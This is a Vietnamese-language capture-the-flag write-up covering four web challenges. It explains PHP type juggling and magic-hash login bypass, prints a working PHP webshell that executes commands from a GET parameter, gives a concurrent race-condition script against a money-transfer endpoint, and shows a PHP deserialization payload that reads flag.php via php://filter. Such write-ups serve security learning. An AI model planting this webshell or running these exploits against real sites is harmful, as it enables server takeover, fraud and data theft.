# **Magic shop**

*Mở đầu là 1 form login, mở source:
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/e193728d-cd4d-4f79-a928-534b98ea9903)

-Trong đoạn code trên trang web sẽ lấy username và password bị hash bằng sha256 và kiểm tra điều kiện pasword phải bằng 0 thì mới login được. Mặc dù password đã bị hash nhưng ta vẫn có thể login được. Bởi vì trang web sử dụng sử dụng `==` để so sánh 1 chuỗi với 1 interger nên nó có thể bị 1 lỗ hổng là Type Juggling  
-Khi so sánh một string với một số interger trong PHP, nếu như string bắt đầu bằng một ký tự không phải là số, nó sẽ mặc định là int(0) hoặc các strings bắt đầu với các ký tự là 0e, khi đó các chuỗi được chuyển thành các lũy thừa tương đương đương với int(0)   
-Bên cạnh đó ta có 1 lỗ hổng khác là magic hashes nó xuất hiện do một lỗi trong cách PHP xử lý kiểu dữ liệu khi so sánh chuỗi băm với số nguyên. Nếu một chuỗi băm bắt đầu bằng “0e” . Thế nên ta có thể dễ dàng tìm thấy payload trên mạng    
**nguồn payload** https://github.com/spaze/hashes  
=> qua được phần login

*Phần sau là 1 chức năng upload file và trong source không có chức năng bảo mật gì nên ta chỉ cần upload file webshell lên và và thực hiện tìm flag thôi  
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/591a9e8a-9cd5-4ea1-8d7f-50ef6e20cbf2)

file upload: webshell.php
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```


![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/28f77c09-88d6-4656-b5f5-abfc64c63f1f)

# Be Positive
Bài này chỉ cần lúc chuyển chiền cho tài khoản khác sửa thành số âm là được. sau đó dùng số tiền đó để mua flag

# Slow Down
Bài này trang web tương tự Be Positive, payload nhưng chuyển tiền qua tài khoản khác bằng số âm đã không còn hoạt động ở bài này. Mình nghĩ bài này rất có thể sẽ bị lỗ hổng race condition=> đúng thật là nó ;v

**exploit**
```
import asyncio
import httpx

async def use_code(client):
    resp = await client.post(f'http://slow-down-44f3a156.dailycookie.cloud/?action=transfer', cookies={"PHPSESSID": "e4dbc35e8795f3889acff05a0baff65d"}, data={"amount": "100.849%","recipient":"alice"})
    return resp.text

async def main():
    async with httpx.AsyncClient() as client:
        tasks = []
        for _ in range(20): #20 times
            tasks.append(asyncio.ensure_future(use_code(client)))
        
        # Get responses
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Print results
        for r in results:
            print(r)
        
        # Async2sync sleep
        await asyncio.sleep(0.5)
    print(results)

asyncio.run(main())
```
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/d39804e2-b510-498c-8ec0-794fa3888acb)

# Video Link Extractor
+ Khi thực hiện extract localhost trang web thực hiện đoạn code:
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/96d5c64e-0dd3-4e96-a5d0-9af5e56a98dc)
+ Ta có thể lợi dụng tham số id để gọi đến `redirect ` và khiến nó truy cập vào trang web khác 
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/79b9f246-6418-4b22-b75b-17be148af615)
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/c5e03245-27eb-4c41-827c-0e5d7721603f)
+ Đã thực hiện get vào trang web của mình
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/f61766f4-0e69-4551-8981-a7055e0447ea)

Untrusted data sẽ là response ta trả về, khi đó nó được unserialize  
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/d7d50fe9-c81c-4c3c-90e7-94338d6498a5)
Thêm vào đó object Utils khi __wakeup sẽ gọi $this->_file  
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/fd5ebec4-0a91-4d57-be85-c6bd1333cbe8)
Script tạo serialize data:
```
<?php 
class Utils {
    public $_file = "php://filter/convert.base64-encode/resource=flag.php";
};
echo(serialize(new Utils()));
?>
```
Thay kết quả của script vào response của webhook   
![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/3c8e2fb8-eea4-4e69-8fa1-cc04a4516059)

![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/241fcbd6-4164-4401-ad53-41fd4d5bbce0)

![image](https://github.com/vanatka10/ctf_walkthrough/assets/126310360/7620d7ab-7190-40f5-adc3-e5b2120a418f)


